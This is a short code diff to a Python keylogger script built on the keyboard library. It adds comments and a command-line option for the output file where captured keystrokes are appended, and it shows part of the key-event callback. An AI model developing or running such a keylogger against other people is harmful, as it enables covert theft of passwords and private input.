@@ -3,19 +3,22 @@ import keyboard
 import os
 from threading import Semaphore, Timer
 
+#argument suport
 parser = argparse.ArgumentParser()
 parser.add_argument("-o","--output",required=True,help="Name of the output file")
 args = vars(parser.parse_args())
 
 class Keylogger():
   def __init__(self):
+    #reads inputs
     self.log = ""
+    #write out file 
     self.out = open(args["output"],"a")
+    #thread
     self.Semaphore = Semaphore(0)
 
   def callback(self,event):
     name = event.name
-
     if len(name) > 1:
       if name == "space":
         name = " "
